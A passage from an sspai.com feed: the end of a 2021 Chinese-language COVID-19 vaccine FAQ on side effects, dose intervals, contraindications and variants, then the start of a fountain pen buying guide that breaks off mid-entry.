src=\"https://cdn.sspai.com/2021/06/04/70314d72c646dfa55e8489b99192dbd9.jpeg\"><figcaption>世界疾控中心给出的注射疫苗后常见症状</figcaption></figure><p>根据世界卫生组织的报告，全身性的不适反应包括疲劳、头痛、身体、疼痛、寒颤和恶心，部分接种者在接种部位还会有局部症状如肿胀、疼痛、发红、发痒的皮疹等，而且往往第二针的不良反应会大于第一针。但这个其实不是新冠疫苗的特性，而是疫苗引起免疫反应过程中的共性，换句话说其实只要是疫苗，都有产生不良反应的可能。</p>\n<p>虽说有不良反应是正常现象，却不是说没有就不正常或者反应越大效果越好。目前的临床试验中都没有结果表明免疫效果和不适程度呈正相关。因此，要是打疫苗后感到严重不适，尤其是产生了和世卫组织报告不同的症状，千万不要硬撑，及早就医。</p>\n<ul><li>参考阅读：<a href=\"https://www.medicalnewstoday.com/articles/global-covid-19-vaccine-summary-side-effects\">Global COVID-19 vaccine summary: Side effects</a>\n</li></ul>\n<h3>对于上述的不良反应，可以采取措施缓解甚至提前预防吗？</h3>\n<p>如果出现了上述症状，但感觉自己还能忍受，是不是一定要去医院呢？</p>\n<p>不用，去医院不是必须的。根据 <a href=\"https://www.cdc.gov/coronavirus/2019-ncov/vaccines/expect/after.html\">世界疾控中心的建议</a>，对于常见的全身症状及局部症状，可以采取服用对应的非处方药以及外部措施来进行缓解。但是高度不建议在副作用还没有发生的时候就吃药来预防。</p>\n<p>如果你以前服用过布洛芬、对乙酰氨基酚、阿司匹林或抗组胺药，或者通过电话、微信等与医生取得了交流，确认可以服药，那就可以通过服用这些药物来缓解症状。</p>\n<p>对于不想服用药物的朋友，<a href=\"https://www.medicalnewstoday.com/\">MEDICALNEWSTODAY</a> 也提供了一些缓解措施：</p>\n<ul>\n<li>对于注射部位的反应，例如疼痛或肿胀，请使用干净、凉爽的湿毛巾进行敷布。这也可能有助于缓解肌肉和关节疼痛。</li>\n<li>为了缓解手臂的酸痛或僵硬，请尽可能多地移动它。这可能看起来违反直觉并引起一些不适，但它有助于通过放松酸痛的肌肉来防止进一步僵硬。</li>\n<li>任何有寒战和低烧的人都应该确保多喝水以避免脱水。穿轻便的衣服并分层穿衣将有助于防止过热。</li>\n<li>若不良反应太强或持续时间过长，或采取上述措施无法缓解，请一定要及时就医，一昧的忌医不但会加重症状，且很可能会错过最佳治疗时机而产生不可预期的后果。</li>\n</ul>\n<h3>为什么有的疫苗需要打多针？每一针的作用是什么？可以多打吗？</h3>\n<p>读到这里，你可能已经理解了疫苗作用的基本原理，但还会奇怪：为什么有些疫苗需要打多针呢？是为了让「保安」更清楚地记住「坏人」吗？</p>\n<p>是的。不同疫苗的接种剂次不同，这主要是由疫苗接种后的效果决定的，疫苗接种的效果要综合考量抗体水平、抗体持久性、免疫记忆、预防疾病的效果等等因素。每次接种对免疫系统都有刺激作用，都能刺激我们的身体产生对应的抗体和记忆细胞，抗体就是帮助我们抵抗病毒感染的最关键的效应成分。</p>\n<p>在免疫学中有着「初次应答」和「再次应答」的概念，如果把第一针看作对于新冠的「初次应答」，那么接种的第二针、第三针等，则可以看作「再次应答」，我们的身体再次应答中往往能更快地产生抗体，抗体浓度上升得更快、维持时间更长，亲和力也更高。</p>\n<p>简言之，不同疫苗的类型决定了「保安」每次记住「坏人」特征的清晰度有所不同，为了确保「保安」能记住「坏人」的特征，有些疫苗就需要多次把「坏人」的特征丢给「保安」。</p>\n<p>一般来说，疫苗接种的次数越多，产生的免疫力也就越强。有人一定会问：那是不是可以无限制接种或是增加剂量来增强免疫力？理论上是这样，但事实上当接种达到一定的剂次之后，就不会再增加免疫效果。</p>\n<p>拿北京生物所的灭活疫苗举例，在在接种第一针后疫苗的保护率可以达到 60%，而第二针就可以提升到 95%，然而再打却收效甚微。在 Ⅰ、Ⅱ 期临床试验中，分别使用 2 倍剂量接种一剂、1 倍剂量接种两剂，前者的抗体滴度低于后者。</p>\n<ul><li>参考阅读：第一、二期临床试验结果：<a href=\"https://www.thelancet.com/journals/laninf/article/PIIS1473-3099(20)30831-8/fulltext\">点击这里</a>\n</li></ul>\n<p>其实这也不难理解。「保安」认一次「坏人」，或许能记住但认得不太清楚，再认一次就认清了，出动也更快了，但是再增加辨认的次数，对于「保安」的记忆并不会提升多少，因为他已经把能记的都记住了。</p>\n<h3>接种灭活疫苗，第一针和第二针的间隔期需要严格遵守吗？</h3>\n<p>接种打两针的灭活疫苗时，医生都会叮嘱你要间隔三至八周后接种第二针，这是有其道理的。</p>\n<p>上面我们提到，疫苗的每一针都是在激活我们的免疫系统产生免疫力。研究发现，相距 21 或 28 天的两针联程疫苗能够产生较高的中和抗体水平，所以才提出了三至八周的接种间隔。</p>\n<p>根据一般规律，打两针的全病毒灭活疫苗延长需多剂次接种疫苗（非活疫苗）的各剂次间的间隔，不会降低疫苗效果。但缩短多剂次接种疫苗（非活疫苗）的各剂次间的间隔，可能干扰免疫应答和保护力。换言之，如果你真的有事耽误了第二针，错过了最佳接种时机，理论上不会影响接种效果。但尽量不要提前去打第二针，因为免疫系统记住一个病毒的特征需要一定的时间和过程。</p>\n<ul><li>参考阅读：《<a href=\"http://zhishifenzi.com/news/multiple/10224.html\">又一国产疫苗公布一二期临床结果，对老年人安全有效</a>》、《<a href=\"http://www.nanan.gov.cn/zwgk/zfxxgkzdgz/jbylws/gjmygh/202103/t20210301_2516885.htm\">健康科普：新冠病毒灭活疫苗两剂次之间间隔多久？</a>》</li></ul>\n<h3>注射疫苗后的有效期是多久？真的只有半年或九个月吗？</h3>\n<p>新冠疫苗目前还处于研发和刚投入使用的阶段，能保证它的安全性，至于持久性还需要长期的持续监测和研究。之前谣传的「有效期只有半年」，其实是灭活疫苗在第一批接种者注射半年后随访时，检测到体内仍有一定水平的抗体，因此称「有效期至少有半年」。</p>\n<p>至于「打一针」疫苗，有人也担心只打一针会不会缩短有效期，目前也明确有效期至少可以持续六个月。而且对采用同种技术的埃博拉疫苗免疫持续性观察显示，接种两年后应仍有足够的免疫力。</p>\n<h3>打完疫苗后就可以不戴口罩了吗？就可以不做核酸检测了吗？</h3>\n<p>不可以🙅‍♂️现在的任何一种疫苗都没有 100% 的保护力，不是「开了就能在毒区漫步」的外挂。因此，佩戴口罩，少去人群密集的地方，仍然是不可或缺的自我保护途径。同理，在需要做核酸检测的场合也应该配合做核酸检测，你放心大家也都放心。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/06/04/272c8a4e7c49e4de2c156a6de0262958.jpeg\"><figcaption>接种了疫苗依然有可能感染，截图来自 @中国新闻周刊</figcaption></figure><p>新冠病毒疫苗的核心作用是让接种者接触到病源后得病的概率降低，极大程度避免继发重症。用网络上一个玩笑性质的科普就是「增加 80% 的闪避几率，被命中后减少 99% 的伤害，并且 100% 免疫暴击」，再次强调，目前人类还没有任何疫苗能够 100% 避免某种病症的感染。</p>\n<p>补充一个有趣的信息：根据来给我们上课的附属医院急诊科老师所说，自从疫情以来，因为大家自觉佩戴口罩，来急诊挂号的呼吸道感染病人大大减少。可见，无论新冠与否，佩戴口罩本身就是一个健康的好习惯。</p>\n<h3>过敏体质能打疫苗吗？</h3>\n<p>「过敏」是一个很笼统的概念，除了极度易过敏体质，其它常见的鱼虾、花粉过敏者基本是对某种物质敏感，不一定就是《接种指南》里提到的对疫苗成分过敏。</p>\n<p>新冠病毒灭活疫苗的辅料主要包括磷酸氢二钠、氯化钠、磷酸二氢钠、氢氧化铝等。如果不确定自己是不是以上物质过敏者，或既往发生过疫苗过敏（如急性过敏反应、过敏性休克、血管神经性水肿、呼吸困难等）但又想接种新冠疫苗的，建议还是咨询医师以获取专业的意见。</p>\n<p>简言之，如果你觉得自己是「过敏体质」，请申请注射疫苗时及时向工作人员反馈，他们会给出合理的判断。</p>\n<h3>注射新冠病毒疫苗，能和其它疫苗同时接种吗？</h3>\n<p>简单来说，近期（14 天内）有接种其它疫苗的都不建议急于接种新冠疫苗。可以理解为免疫系统在前一轮打疫苗过程中已经工作得有点累了，再打新冠有可能会使它超负荷，也因此会导致不良反应加剧。</p>\n<p>但是若在接种新冠疫苗后，不慎被猫狗咬伤抓伤、被带锈金属物品造成深且狭长的伤口等，仍应及早接种对应的疫苗进行人工被动免疫，起到治疗或紧急预防疾病的作用。</p>\n<h3>什么人不可以打疫苗？</h3>\n<p>除了上面提到的过敏者，还有一些接种的禁忌症，这在《接种指南》以及各地的医院保健账号都有提及，为了方便大家查阅，我在这里将从相对可靠的账号所发布消息进行收集再整理，如有纰漏欢迎补充。</p>\n<p>以下整理内容来自广东卫生信息、央视新闻、国家疾控中心——</p>\n<ul>\n<li>任何原因（如感冒、局部炎症、肿瘤、风湿免疫性疾病等）引起发热（腋下体温 ≥ 37.3℃）者；结核病活动期者。</li>\n<li>急性脑病（脑炎、梗塞、出血等），或有惊厥、精神疾病史或家族史者；癫痫和其他严重神经系统疾病者（如横贯性脊 髓炎、格林巴利综合症、脱髓鞘疾病等）未控制的患者，或其他进行性神经系统疾病患者。</li>\n<li>呼吸系统急性感染、慢性阻塞性肺疾病急性发作期、支气管哮喘急性发作或临床未控制、胸膜疾病急性期等患者。</li>\n<li>血压 ≤ 90 / 60 mmHg（原因不明），高血压通过生活方式调整和（或）药物治疗、血压仍 ≥ 160 / 100 mmHg，严重冠心病，心律失常，心率低于 60 次 / 分或大于 100 次 / 分，严重心脏瓣膜病变，主动脉夹层，静脉血栓形成，严重心力衰竭，严重心律失常，急性冠脉综合征，急性主动脉综合征等患者。</li>\n<li>消化道出血、急性胰腺炎、急性肠梗阻，炎症性肠病活动期，急性肝炎或慢性肝炎活动期等患者。</li>\n<li>急性泌尿、生殖系统感染，严重肾病患者（未控制的急、慢性肾炎患者，正在使用糖皮质激素、免疫抑制剂或生物制剂的肾脏病患者，急性肾功能不全患者或慢性肾脏病 3 期以上即肾小球滤过率 eGFR &lt; 60 ml/min 的患者）。</li>\n<li>糖尿病急性并发症（酮症酸中毒、高渗状态、乳酸酸中毒）或患有上述急性并发症痊愈未满2周的糖尿病患者；空腹血糖 &gt; 13.9 mmol/L 者；甲状腺功能减退 TSH &gt; 10 μIU/L，且 T3、T4 低于正常值者；未控制的甲状腺功能亢进或甲亢性突眼患者。</li>\n<li>淋巴增殖性疾病未控制，再生障碍性贫血未缓解，原发免疫性血小板减少症（ITP）活动期，出凝血疾病未控制等患者。</li>\n<li>免疫系统疾病（系统性红斑狼疮、类风湿关节炎、强直性脊柱炎、干燥综合征等）活动期，先天性或获得性免疫缺陷，明确合并机会性感染或恶性肿瘤未控制的HIV 感染者，淋巴瘤、白血病或自身免疫性炎症性疾病患者。</li>\n<li>恶性肿瘤患者手术前后，正在进行化疗、放疗、免疫治疗等患者；器官移植状态患者。</li>\n<li>严重过敏性鼻炎急性期，急慢性湿疹或荨麻疹症状体征明显者，或伴有皮肤其它症状发作期。</li>\n<li>既往新冠肺炎病毒感染者（确诊或无症状）6 个月内。</li>\n<li>妊娠期妇女。</li>\n<li>除以上禁忌症外，如在接种前有身体不适者，都应到正规医院去咨询专业的医师意见。</li>\n</ul>\n<h3>我有以上禁忌症相关情况，能不能打疫苗呢？</h3>\n<p>在《接种指南》中归类了六类特定的人群，分别为 60 岁及以上人群、18 岁以下人群、慢性病人群、育龄期和哺乳期女性、免疫功能受损人群、既往新冠患者或感染者，并分别有对应的接种建议，可以到开头贴出的《接种指南》链接中跳转查阅准确的表述。在这里也为了方便读者将搜集到的进一步阐述进行整理：</p>\n<p>以下信息来自广东卫生信息、央视新闻、国家疾控中心等——</p>\n<ul>\n<li>已知对尘螨、食物（鸡蛋、花生、海鲜、芒果）、花粉、酒精、青霉素、头孢或者其它药物过敏，可以接种。</li>\n<li>患有心脏病，冠状动脉粥样硬化等疾病，不是急性发作期，可以接种。</li>\n<li>健康状况稳定，药物控制良好的慢性病人群不作为新冠病毒疫苗接种禁忌人群，建议接种。</li>\n<li>高血压药物控制稳定，血压低于 160/90 mmHg，可以接种。</li>\n<li>糖尿病药物控制稳定，空腹血糖 ≤ 13.9 mmol/L、无急性并发症（酮症酸中毒、高渗状态、乳酸酸中毒），可以接种。</li>\n<li>甲减患者服用稳定剂量左甲状腺素（优甲乐），甲功正常，可以接种。</li>\n<li>慢性湿疹没有明显发作，且处于非治疗阶段，可以接种。</li>\n<li>慢性荨麻疹当前症状不明显，且处于非治疗阶段，可以接种。</li>\n<li>慢性鼻炎、慢性咽炎症状不明显，可以接种。</li>\n<li>慢性肝炎非治疗阶段，肝功正常，可以接种。</li>\n<li>肺结核不是活动期，可以接种。</li>\n<li>银屑病非脓疱型等急性类型，处于非治疗阶段，可以接种。</li>\n<li>牛皮癣、白瘢风，处于非治疗阶段，可以接种。</li>\n<li>慢阻肺非急性发作期，无明显咳喘，可以接种。</li>\n<li>强直性脊柱炎无急性疼痛表现，且炎症指标无明显异常，可以接种。</li>\n<li>抑郁症药物控制良好，生活工作如常，可以接种。</li>\n<li>精神疾病患者，病情稳定，可以接种。</li>\n<li>用于治疗糖尿病的各种药物（包括注射胰岛素），均不作为疫苗接种的禁忌。</li>\n<li>免疫系统疾病（系统性红斑狼疮、类风湿关节炎、干燥综合征等等）总体原则是谨慎接种。一般情况下，在病情稳定时可以接种灭活疫苗和重组亚单位疫苗。</li>\n<li>恶性肿瘤术后超过三年，不再进行放化疗；肾病综合征；肾移植后吃免疫抑制药物；艾滋病患者、HIV 感染者, 建议接种灭活疫苗或重组亚单位疫苗。</li>\n<li>阴道炎，尿道炎等泌尿系统感染，无发热，处于非治疗阶段，可以接种。</li>\n<li>单纯腹泻，无发热，每日不超过三次，可以接种。</li>\n<li>心脏病、支架、搭桥、安装起搏器，术后恢复正常, 可以接种。</li>\n<li>器官移植术后，恢复良好，体征平稳，建议用新冠灭活疫苗。</li>\n<li>脑梗塞治愈者，或有后遗症（且病情稳定、血压控制平稳）者，可以接种。</li>\n<li>阑尾炎术后、人工流产术后，身体恢复良好，没有其他不适的话，可以接种。</li>\n<li>骨折、外伤，无感染发热，可以接种。</li>\n<li>备孕期、哺乳期可以接种，哺乳期可继续哺乳。</li>\n<li>男性不存在因备孕不能接种新冠病毒疫苗的问题。</li>\n</ul>\n<h3>现有疫苗对变异毒株还有效果吗？还值得接种吗？</h3>\n<p>日前，在广州确诊病例检测病毒属于在印度发现的 Delta 变异毒株，深圳确诊病例病毒属于在英国发现的 Αlpha 变异毒株。在全国防疫措施开展良好的大环境下，新出现的疫情来自境外输入并不奇怪。</p>\n<p>而根据新近的研究报告都表明，在我国最近确诊的毒株不会使现存疫苗完全失效，顶多会让效力轻微下降，且不排除个体差异所致。因此，及时接种疫苗仍是不二之选。</p>\n<ul><li>参考阅读：<a href=\"https://www.medicalnewstoday.com/articles/new-sars-cov-2-variants-how-can-vaccines-be-adapted\" target=\"_blank\">本文</a> 的「Do vaccines work against variants?」部分</li></ul>\n<h3>越南的新变异毒株据说在空气中传播更快，是不是意味着更危险了？</h3>\n<p>当地时间 5 月 29 日，<a href=\"https://e.vnexpress.net/news/news/vietnam-discovers-new-coronavirus-variant-with-uk-indian-mutations-4285878.html\" target=\"_blank\">越南快报网站报道</a>，在越南发现新型变异毒株，且目前尚未证实现有疫苗是否失效。</p>\n<p>初步检查可知属于先前在印度发现的新冠变异毒株与在英国发现的新冠变异毒株的混合体，能在空气中迅速传播。</p>\n<p>在微生物学的角度来看，「混合体」并不是我们日常理解的两种已有混合毒株混合在一起，而是 A 病毒的经过 RNA 突变获得了原本属于 B 病毒的某些特点，而在这一次越南新毒株中就是原本的 Delta 变异毒株，经过突变获得了 Alpha 变异毒株的特点，具备了更强的传染能力。</p>\n<p>但原文所说的「更容易在空气中传播」，并不等同于骇人听闻的空气传播。须知新冠病毒原本的传播方式主要是飞沫传播，可能是携带新型变异病毒的飞沫在空气中存在致病性的时间会长于以往的毒株。</p>\n<p>同时，传染性、致病性和免疫性在病毒上其实是相对独立的三个特性，具有更强的传播性并不等同于更容易致病，更不能说明感染者的症状会更严重，也不能说明现有疫苗就已经会失效，这些都还有待进一步的研究。</p>\n<p>越南出现的新变异毒株说进一步说明了尽快接种疫苗的必要性。</p>\n<h2>结语</h2>\n<p>絮絮叨叨写了近万字，大概是把我收集到的信息都整理了一遍，希望其中有你想知道的内容，或至少能解答一些疑惑，要是还能有帮助，那就已经很值得了。</p>\n<p>读完全文的朋友会发现我没有对各种疫苗的优劣和效力进行分析，一方面确实是个人能力有限，在忙于学业和写稿的这段时间无法更多更仔细地阅读相关的临床试验的报告，也无从进一步了解各大企业及疫苗制作验证的过程，因而无法给出精确的意见；另一方面，我认为目前疫苗有限而接种者多的现况，大家能选择的范围不大，与其拘泥于打哪一种，还不如有什么打什么，尽早接种才更安心。应该明确，能通过国家药品监督管理局的检验，批准上市给大众接种的疫苗，都具有极高的安全性和可靠的免疫效力。</p>\n<p>希望大家能及早接种疫苗，远离疾病的困扰 🙏</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\">正版软件</a>，少数派为你呈现 🚀</p>\n","link":"https://sspai.com/post/66902"},{"title":"不买可以先收藏 07：从自用到送礼，帮你选支好钢笔","date":"2021-07-07 08:00:54","description":"\n<p>上次我们邀请了几位现在还在使用钢笔的作者，来给大家分享一下自己与钢笔的故事与使用钢笔的心得。其实钢笔并不是什么很难拥有的东西，也绝非拥有敏感细腻的触觉才能体会出差异。在我看来，钢笔作为一种书写工具，其乐趣大多是实用价值的延伸。一支好的钢笔，可以让你满足日常书写需求的同时，在机械重复的劳作中体会到一点蕴含着的细小意趣。我收集了一些目前在产或存量较大，且整体表现与价位基本相符的型号，如果你希望尝试一下使用钢笔书写，不妨在购买前参考一下。</p>\n<p>这份钢笔推荐，主要源自我个人的使用经验以及爱好者社区内部的普遍评价。但请务必注意，<strong>手感</strong>是非常玄学的，个人的力道、使用习惯、握笔姿势都可能对钢笔的整体使用表现造成影响，在参考时如果有条件，最好试一试实物。</p>\n<p>关联阅读：<a href=\"https://sspai.com/post/66901\" target=\"_blank\">我为什么还在使用钢笔？</a></p>\n<h2>选钢笔时，我们到底在选什么</h2>\n<p>和常见的滚珠类书写工具相比，钢笔最大的不同就是书写原理。墨水从储墨装置到纸上主要靠的是毛细现象，而大多数滚珠笔字迹落纸的过程靠的是摩擦力。在书写体验方面，滚珠笔落纸的触感主要受笔尖形状、下笔力度以及笔芯弹性与固定方式影响，所以大多数时候滚珠笔的手感非常相似，除非增加了额外的缓冲弹簧，或者采用了过细的笔芯与宽松的固定方式；相比之下，钢笔的变量就大大增多，笔尖的材质、厚度、打磨方式，毛细的疏密、质量，笔舌的长短、形状，乃至墨水的性质，都有可能影响下笔的实际触感。</p>\n<p>此外，不同的钢笔也有不同的外壳材质、厚度、上墨方式、防干墨装置等等设计上的差异，体现到实际的笔上，可能影响的就是握感、重心、一笔出水等等方面，这些与上面的综合起来，才能组成一支钢笔的「书写体验」。你看到的钢笔这一品类价格区间上下极大的落差，就是这些影响因素在不同层级上变化的体现。</p>\n<p>问题就在于，市面上这些不同的型号到底在哪一方面下了成本。</p>\n<p>很多人常常抱怨自己便宜钢笔不好用不如去买中性笔，很大程度上是因为目前进入文具店的「平价钢笔」把该花的钱花错了地方。毕竟文具店的主力顾客是中小学生，商家就想当然地把「花哨好看」当成了第一卖点，然后造一些实用层级上的灾难出来；甚至价格上到几百块，还有这样的情况发生。</p>\n<p>我在挑选钢笔时基本遵循这样的规律：<strong>先挑握感、再挑笔尖</strong>，其次是笔杆材质和做工，然后是上墨方式，最后是外形和品牌——当你不知道一支钢笔是否适合你时，可以按照这样的顺序考察一番。不过在实际操作中也会有些例外出现，我在推荐过程中会逐步提及。</p>\n<h2>1-299 元：入门钢笔不吃亏</h2>\n<p>之所以把 300 以下划成一档，是因为在这个价位段中，无论是挑笔身设计、挑笔尖材质、挑品牌还是笼统地挑性价比，你都能找到至少一支在单独一方面够得上条件的笔。但同样地，这个价位的钢笔组成非常复杂，坑也最多，型号更新也较为频繁。在挑选时，还是要尽可能地寻找相关参数和体验报告来辅助购买决策。这个价位的钢笔品控大多也不够稳定，需要一定运气成分。</p>\n<h3>国产暗尖钢尖笔可能是你的童年</h3>\n<p>很多人第一次接触钢笔可能就是英雄、永生这些经典的国产老牌，但可惜的是，这么多年过去，永生已经消失，其品牌被英雄实业收购，又授权给了其他的厂家，市面上的永生已经大多是新厂货了。随着当年的库存逐渐消耗，现在想要淘到老永生和老英雄已经不太容易了。</p>\n<p>但是，如果考虑上价格因素，无论现产与否，有两个型号的英雄钢笔是随时可以推荐的：其一是英雄 616 中号，其二是英雄 329-2。两款价格在 9-15 元左右，有非常合适的性价比。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/b041f5a27485314561688e2ecf81aca0.png\"></figure><p>英雄 616 就是曾经最经典的英雄钢笔，暗尖设计、笔握上方一道观墨窗、超大储墨量。但需要注意的是，616 目前也有不少的衍生型号，那个最经典的是 616 中号，衍生的诸多型号实际体验都有些差距。虽然即使是中号 616 也有不少的品控问题，但既然考虑到这个分类了，肯定是有一定<strong>情怀因素</strong>在的，还是尽量寻找经典款比较合适。其次就是 329-2，这也是比较典型的国产暗尖笔型号，同样，329 也有很多衍生系列，但相对评价较好的是 329-2 这一分支，据说这是当年的出口型号。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/fee1178c9dafdc3efcf07b926e548b68.png\"></figure><p>这两款暗尖笔承载了太多的国民记忆，但它们年代久远、技术陈旧也是事实，<strong>实际的书写体验可能不够优秀</strong>。其次，这个价格区间里想买到一直完美钢笔是纯粹的运气活，你可能需要一定的调整技术。我不建议采用一次买十支然后一支支挑选的方法，有那个闲钱不如去买一些更好的钢笔，花给 616 真的没有必要。严格来讲，它们不算「好的钢笔」，而是「经典的钢笔」，所以这两个型号更适合那些想<strong>找回老钢笔记忆</strong>，或者<strong>打算随便买一支钢笔日用</strong>的朋友。</p>\n<p>目前的国笔市场可谓一片混乱，所以我也不敢贸然推荐那些新厂子或者新品牌的钢笔。如果你对它们有兴趣的话，注意实用主义者尽量不要买金属外壳，不要买笔杆过粗过细的；特别想要金属的，笔握也尽量不要采用金属材质；购买之前多看评价、评测和体验，确保没有大的结构问题即可。</p>\n<h3>最便宜的日产钢笔体验装</h3>\n<p>在讨论外国钢笔时，常常笼统地把它们分为两大类：日产和欧美产。究其原因，主要还是日本和欧美地区在笔尖打磨、出墨量、笔尖弹性等各方面书写要求的差异所致。大致来讲，欧美钢笔更注重圆滑、顺畅，在较粗的笔尖上表现更好；日系钢笔则与国产钢笔要求类似，讲求打磨上利于出锋，较细的笔尖也要表现良好，因为汉字系统笔画繁复，要求纤细且清晰。虽然具体写成什么样子还是要看人，但在细笔尖的控制上，日系钢笔毫无疑问地能拔得头筹。</p>\n<p>这个价格的日系钢笔我推荐以下两类：</p>\n<h4>彩墨体验器，白金 Preppy 和百乐 Petit</h4>\n<p>对于一些没有体验过彩墨，但又想买来玩玩的朋友来说，Preppy 和 Petit 都是不错的选择，因为它们都支持墨囊供墨，而且官方有比较鲜艳的彩色可选。两支的价格基本在 20 元上下浮动，它们的笔尖虽然没什么特点，但书写体验都对得起这个价格。彩墨用完之后可以换墨囊，也可以做一些小改装继续使用。我自己的桌面上就常常放着一支 Preppy，用来划线标高亮，便宜好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/5e4d2ec86b38b411a5dca484ed35337f.png\"></figure><h4>学生党最爱的百乐日用钢尖们</h4>\n<p>百乐 78G 在国内的销量一直特别好，好到它的价格都比我第一接触它时涨了几十块。这款钢笔起初主打的就是便宜好用，细尖的出品也比较稳定，对于需要大量爬格子塞小字的学生党来说十分友好。类似采用了这一套笔尖系统的百乐钢笔还有 17G，和 78G 的主要差别是上墨方式不同，17G 没有上墨器，是直接在笔杆里滴墨水，因此储墨量非常巨大。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/01ea151519a06d8f56d8eccc399aee2f.png\"></figure><p>金属杆的 88G 整体质感要比 78G 更好，笔尖体验则相差不多，都是硬滑为主，比较适合速记，而且作为金属杆的钢笔，它的<strong>重心并没有明显的偏高</strong>——这正是我不推荐绝大多数国产金属杆钢笔的原因。如果喜欢比较可爱的外形，还可以选择百乐 Kakuno 笑脸钢笔。88G 的价格大约在 130 元左右，剩余三个型号则集中在 70-90 元。</p>\n<h3>外观党永远的爱</h3>\n<p>对于追求笔身设计的人来说，Lamy 和 Kaweco 是两个绕不开的牌子。Lamy Safari 系列出色的外形设计不仅带动了 Lamy 的销量，甚至养活了一众国内的小笔厂，你在各处都能看见仿制的 Safari。十分讽刺的是，Safari 的写感其实并不算好，Lamy 本身的钢尖品控就非常成问题，尤其是细尖，甚至会出现山寨货比真货好写的情况。但如果要挑一支钢笔随身携带随时写，质量正常的 Safari 以及铝制笔杆的 Al-Star 还真的是不错的选择，因为它们太像中性笔了，你不需要适应，掏出纸笔就能开写，它无趣，但确实是稳定地无趣。在外出速记时，这种无趣反而是优点。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/bb5557668d4cbf4f636b4ea582ad6103.png\"></figure><p>类似地，采用公模笔尖，只重视外观设计的 Kaweco 也因为出挑的外形获得了不少青睐。Kaweco Sport 系列主打的就是口袋便携，短短一支笔，笔帽反扣就是正常尺寸。写着确实不出彩，但它真的太好看了——被此外形所毒结果入手出手过两三次 Sport 的我如是说。Lamy 和 Kaweco 的这些型号价格波动幅度较大，受配色影响也很大，很难给出参考价。尤其 Lamy，购买时需要仔细确实店家资质与论坛、贴吧评价。但可以确定的是，除非你特别喜欢某个限定配色、联名或是决定拿来送礼物，Lamy 都是不值得在官方价格入手的。</p>\n<h3>最经典的国产金笔</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/f42ac0d6339d2a4befac59cc7383d34f.png\"></figure><p>现产的所有国产金笔中，英雄 100 当之无愧是经典中的经典。脱胎于当年「赶超派克 51」的华孚 100 英雄金笔，英雄 100 在这么多年里始终保持生产，成了老型号中几乎仅存的金笔遗产。暗尖设计的 14K 金尖触纸后那种微妙的弹性能让你明显感受到别样的魅力。对于喜欢暗尖的人来说，英雄 100 就是最合适的日用笔了，14K 金尖、瓷实的结构、低调的外观，它把钱花在了最值得升级的那些地方。同样地，英雄 100 也有非常多的衍生型号，一定就只买最基础的款，并且最好是半钢款——即钢笔帽塑料笔杆。全钢的英雄 100 在上满墨水后还是会有微妙的重心偏高，对手小的人来说感受会更加明显。半钢款英雄 100 售价为 265 元。</p>\n<h2>300-799 元：进阶钢笔有玩头</h2>\n<p>预算上升到这个层级后，你就能接触到更多真正算得上优秀，甚至足够退烧的钢笔了。不少钢笔品牌会在这个价位出至少一支带有品牌最大特点，但又没有把配置拉满的「体验级」进阶钢笔。它能让你体验到这一品牌最大的魅力所在，又没有贵气到让你不敢拿去日用。对不太钟意英雄 100 这样暗尖钢笔的人来说，这一片空间就是最大的游乐场。但同样地，有不少非常具有特色的手感在这个价格段完全缺失。各位还是按照自己的预算考虑即可。</p>\n<p>与 1-299 价格区间的钢笔相比，本价位段大多是经典型号，构成比较稳定，有大量的评测和体验文章可供参考。而且通常情况下，该价位无论钢尖还是金尖都会选用更加耐磨的铱粒，笔尖磨损的速度会略有减缓。</p>\n<h3>「日系御三家」的 14K 金笔们</h3>\n<p>在这三家放在世界范围内都很优秀的钢笔厂商里，百乐是实打实的冠军选手，这点毋庸置疑。和剩下两家相比，百乐最大的特点就是它在任何一个价位段都有十分优秀的产品。其实这三家在低端系列都采用了类似的策略，就是只开发一款笔尖和一套供墨系统，而百乐的低端笔尖比白金和写乐品质好了太多。到了这个价位，接触到金尖（和高端钢尖）产品之后，白金和写乐的技术特点就能逐渐显露出来了。</p>\n<h4>写乐 14K 系列</h4>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/72c253ea1e3bc176a63c25350104eb4f.png\"></figure><p>我个人非常喜欢写乐，因为他们的 14K 金尖是我用过最合手的<s>，但他们的钢尖也是我用过最烂的</s>。相比于其他的 14K 尖，写乐可能由于厚度和形状设计特点，手感是偏硬弹的，属于很好控制，速记和练字都能驾驭得住的类型，泛用性比较高。采用这一系列笔尖的有三种，分别是 14K「鱼雷」「天冠」和「四季织」，具体的型号和系列比较混乱，但这三类可以视为只有外形差别。在整个御三家的中端系列金笔中，写乐 14K 是在我看来最适合日用的，价格区间在 500-750 元之间，随配色和外观变化。</p>\n<h4>白金 3776 系列</h4>\n<p>作为白金的当家系列，3776 承载了太多的期望，以至于每年 3776 都要搞点限量色，甚至出现过钢尖款与金尖款共用 3776 名号的状况。当然，这里我要讲的主要是金尖的 3776。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/07/256b1ec15718c6668b014b955b83bd61.png\"></figure><p>同样是 14K 金尖，白金的书写体验可以说独树一帜：不同于一般金尖的顺滑，3776 有一种特殊的阻尼感，书写时你会感到一种独特的摩擦力，再加上白金的笔尖本身略微偏软弹，让 3776 成了一支不适合速记的钢笔，有传言认为这可能是因为日本不少纸张相对较滑，3776 专门做了调试。不少人对白金的书写手感意见颇大，但相对的，这种出挑的手感也让另一部分人对 3776 爱不释手。它在二手市场和一手市场的热度都很高，是典型的人人都值得一试，但评价两极分化的钢笔。价格区间 500-750 元，随配色变化。</p>\n<h4>百乐 5 号尖 14K 系列</h4>\n<figure class=\"image ss-img-wrapper\"><img 